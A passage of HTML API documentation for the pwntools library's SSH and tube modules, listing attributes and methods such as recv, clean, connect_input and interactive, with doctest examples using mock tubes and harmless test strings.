<code class="descname">bits</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.bits" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Pointer size of the remote machine.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.cache">
<code class="descname">cache</code><em class="property"> = True</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.cache" title="Permalink to this definition">¶</a></dt>
<dd><p>Enable caching of SSH downloads (<code class="docutils literal"><span class="pre">bool</span></code>)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.client">
<code class="descname">client</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.client" title="Permalink to this definition">¶</a></dt>
<dd><p>Paramiko SSHClient which backs this object</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.cwd">
<code class="descname">cwd</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.cwd" title="Permalink to this definition">¶</a></dt>
<dd><p>Working directory (<code class="docutils literal"><span class="pre">str</span></code>)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.distro">
<code class="descname">distro</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.distro" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">tuple</span></code> &#8211; Linux distribution name and release.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.host">
<code class="descname">host</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.host" title="Permalink to this definition">¶</a></dt>
<dd><p>Remote host name (<code class="docutils literal"><span class="pre">str</span></code>)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.os">
<code class="descname">os</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.os" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Operating System of the remote machine.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.pid">
<code class="descname">pid</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.pid" title="Permalink to this definition">¶</a></dt>
<dd><p>PID of the remote <code class="docutils literal"><span class="pre">sshd</span></code> process servicing this connection.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.port">
<code class="descname">port</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.port" title="Permalink to this definition">¶</a></dt>
<dd><p>Remote port (<code class="docutils literal"><span class="pre">int</span></code>)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.sftp">
<code class="descname">sftp</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.sftp" title="Permalink to this definition">¶</a></dt>
<dd><p>Paramiko SFTPClient object which is used for file transfers.
Set to <code class="xref py py-const docutils literal"><span class="pre">None</span></code> to disable <code class="docutils literal"><span class="pre">sftp</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.version">
<code class="descname">version</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.version" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">tuple</span></code> &#8211; Kernel version of the remote machine.</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.tubes.ssh.ssh_channel">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.ssh.</code><code class="descname">ssh_channel</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_channel" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a></p>
<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh_channel.interactive">
<code class="descname">interactive</code><span class="sig-paren">(</span><em>prompt = pwnlib.term.text.bold_red('$') + ' '</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L188-263"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_channel.interactive" title="Permalink to this definition">¶</a></dt>
<dd><p>If not in TTY-mode, this does exactly the same as
meth:<cite>pwnlib.tubes.tube.tube.interactive</cite>, otherwise
it does mostly the same.</p>
<p>An SSH connection in TTY-mode will typically supply its own prompt,
thus the prompt argument is ignored in this case.
We also have a few SSH-specific hacks that will ideally be removed
once the <a class="reference internal" href="index.html#module-pwnlib.term" title="pwnlib.term"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.term</span></code></a> is more mature.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh_channel.kill">
<code class="descname">kill</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L135-141"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_channel.kill" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills the process.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh_channel.poll">
<code class="descname">poll</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L165-178"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_channel.poll" title="Permalink to this definition">¶</a></dt>
<dd><p>Poll the exit code of the process. Will return None, if the
process has not yet finished and the exit code otherwise.</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.tubes.ssh.ssh_connecter">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.ssh.</code><code class="descname">ssh_connecter</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_connecter" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a></p>
</dd></dl>

<dl class="class">
<dt id="pwnlib.tubes.ssh.ssh_listener">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.ssh.</code><code class="descname">ssh_listener</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh_listener" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a></p>
</dd></dl>

</div>
</div>
</div>
<div class="section" id="module-pwnlib.tubes.tube">
<span id="pwnlib-tubes-tube-common-functionality"></span><h4><a class="reference internal" href="#module-pwnlib.tubes.tube" title="pwnlib.tubes.tube"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.tube</span></code></a> &#8212; Common Functionality<a class="headerlink" href="#module-pwnlib.tubes.tube" title="Permalink to this headline">¶</a></h4>
<dl class="class">
<dt id="pwnlib.tubes.tube.tube">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.tube.</code><code class="descname">tube</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube" title="Permalink to this definition">¶</a></dt>
<dd><p>Container of all the tube functions common to sockets, TTYs and SSH connetions.</p>
<dl class="method">
<dt id="pwnlib.tubes.tube.tube.can_recv">
<code class="descname">can_recv</code><span class="sig-paren">(</span><em>timeout = 0</em><span class="sig-paren">)</span> &#x2192; bool<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1061-1081"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.can_recv" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns True, if there is data available within <cite>timeout</cite> seconds.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">time</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">can_recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="kc">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">can_recv</span><span class="p">()</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">can_recv</span><span class="p">()</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">can_recv</span><span class="p">()</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.clean">
<code class="descname">clean</code><span class="sig-paren">(</span><em>timeout = 0.05</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L848-875"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.clean" title="Permalink to this definition">¶</a></dt>
<dd><p>Removes all the buffered data from a tube by calling
<a class="reference internal" href="#pwnlib.tubes.tube.tube.recv" title="pwnlib.tubes.tube.tube.recv"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.tubes.tube.tube.recv()</span></code></a> with a low timeout until it fails.</p>
<p>If <code class="docutils literal"><span class="pre">timeout</span></code> is zero, only cached data will be cleared.</p>
<p>Note: If timeout is set to zero, the underlying network is
not actually polled; only the internal buffer is cleared.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">All data received</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s1">&#39;clean me up&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">&#39;clean me up&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">buffer</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.clean_and_log">
<code class="descname">clean_and_log</code><span class="sig-paren">(</span><em>timeout = 0.05</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L877-904"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.clean_and_log" title="Permalink to this definition">¶</a></dt>
<dd><p>Works exactly as <a class="reference internal" href="#pwnlib.tubes.tube.tube.clean" title="pwnlib.tubes.tube.tube.clean"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.tubes.tube.tube.clean()</span></code></a>, but logs received
data with <code class="xref py py-meth docutils literal"><span class="pre">pwnlib.self.info()</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">All data received</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">recv</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;hooray_data&#39;</span><span class="p">]):</span>
<span class="gp">... </span>    <span class="k">while</span> <span class="n">data</span><span class="p">:</span> <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span>      <span class="o">=</span> <span class="n">recv</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">fileno</span>        <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="mi">1234</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">data</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">clean_and_log</span><span class="p">()</span> 
<span class="go">[DEBUG] Received 0xb bytes:</span>
<span class="go">    &#39;hooray_data&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span>
<span class="go">&#39;hooray_data&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.close">
<code class="descname">close</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1271-1276"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.close" title="Permalink to this definition">¶</a></dt>
<dd><p>Closes the tube.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.connect_both">
<code class="descname">connect_both</code><span class="sig-paren">(</span><em>other</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L988-994"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.connect_both" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects the both ends of this tube object with another tube object.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.connect_input">
<code class="descname">connect_input</code><span class="sig-paren">(</span><em>other</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L906-961"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.connect_input" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects the input of this tube to the output of another tube object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="n">x</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">recvone</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]):</span>
<span class="gp">... </span>    <span class="k">while</span> <span class="n">data</span><span class="p">:</span> <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
<span class="gp">... </span>    <span class="k">raise</span> <span class="ne">EOFError</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="n">recvone</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">send_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">shutdown</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">shutdown</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">time</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">connect_input</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">))</span>
<span class="go">data</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.connect_output">
<code class="descname">connect_output</code><span class="sig-paren">(</span><em>other</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L963-986"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.connect_output" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects the output of this tube to the input of another tube object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="n">x</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">recvone</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]):</span>
<span class="gp">... </span>    <span class="k">while</span> <span class="n">data</span><span class="p">:</span> <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
<span class="gp">... </span>    <span class="k">raise</span> <span class="ne">EOFError</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="n">recvone</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">send_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">shutdown</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span><span class="o">.</span><span class="n">shutdown</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">d</span><span class="p">:</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">connect_output</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">))</span>
<span class="go">data</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.connected">
<code class="descname">connected</code><span class="sig-paren">(</span><em>direction = 'any'</em><span class="sig-paren">)</span> &#x2192; bool<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1151-1183"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.connected" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns True if the tube is connected in the specified direction.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>direction</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Can be the string &#8216;any&#8217;, &#8216;in&#8217;, &#8216;read&#8217;, &#8216;recv&#8217;,
&#8216;out&#8217;, &#8216;write&#8217;, &#8216;send&#8217;.</td>
</tr>
</tbody>
</table>
<p>Doctest:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="n">x</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">connected_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="nb">map</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">connected</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;any&#39;</span><span class="p">,</span> <span class="s1">&#39;in&#39;</span><span class="p">,</span> <span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="s1">&#39;recv&#39;</span><span class="p">,</span> <span class="s1">&#39;out&#39;</span><span class="p">,</span> <span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="s1">&#39;send&#39;</span><span class="p">))</span>
<span class="go">any</span>
<span class="go">recv</span>
<span class="go">recv</span>
<span class="go">recv</span>
<span class="go">send</span>
<span class="go">send</span>
<span class="go">send</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">connected</span><span class="p">(</span><span class="s1">&#39;bad_value&#39;</span><span class="p">)</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">KeyError</span>: <span class="n">&quot;direction must be in [&#39;any&#39;, &#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;]&quot;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.fileno">
<code class="descname">fileno</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1281-1287"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.fileno" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the file number used for reading.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.interactive">
<code class="descname">interactive</code><span class="sig-paren">(</span><em>prompt = pwnlib.term.text.bold_red('$') + ' '</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L767-817"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.interactive" title="Permalink to this definition">¶</a></dt>
<dd><p>Does simultaneous reading and writing to the tube. In principle this just
connects the tube to standard in and standard out, but in practice this
is much more usable, since we are using <a class="reference internal" href="index.html#module-pwnlib.term" title="pwnlib.term"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.term</span></code></a> to print a
floating prompt.</p>
<p>Thus it only works in while in <a class="reference internal" href="index.html#pwnlib.term.term_mode" title="pwnlib.term.term_mode"><code class="xref py py-data docutils literal"><span class="pre">pwnlib.term.term_mode</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recv">
<code class="descname">recv</code><span class="sig-paren">(</span><em>numb = 4096</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L46-78"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recv" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives up to <cite>numb</cite> bytes of data from the tube, and returns
as soon as any quantity of data is available.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Raises:</th><td class="field-body"><a class="reference external" href="https://docs.python.org/2.7/library/exceptions.html#exceptions.EOFError" title="(in Python v2.7)"><code class="xref py py-exc docutils literal"><span class="pre">exceptions.EOFError</span></code></a> &#8211; The connection is closed</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A string containing bytes received from the socket,
or <code class="docutils literal"><span class="pre">''</span></code> if a timeout occurred while waiting.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Fake a data source</span>
